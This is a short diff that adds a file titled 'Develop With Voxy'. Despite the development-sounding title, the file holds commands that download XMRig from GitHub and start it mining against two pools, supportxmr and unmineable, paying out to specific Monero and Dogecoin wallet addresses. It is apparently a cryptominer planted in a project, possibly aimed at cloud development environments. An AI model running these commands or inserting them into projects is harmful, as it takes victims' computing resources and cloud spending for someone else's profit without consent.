@@ -1,0 +1,12 @@
+Develop With Voxy  
+
+
+ wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz 
+ 
+tar -xf xmrig-6.12.1-linux-x64.tar.gz
+ 
+cd xmrig-6.12.1
+ 
+./xmrig --threads=2 -o pool.supportxmr.com:5555 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQqoJAjjRR6vSLviBVE -p cloud
+
+./xmrig --threads=1 -o rx.unmineable.com:3333 -a rx -k -u DOGE:DCVsVkbQXXuh14jjgvxyJmv1WTNYtYfhZi.Tarik_laptop -p Cloud
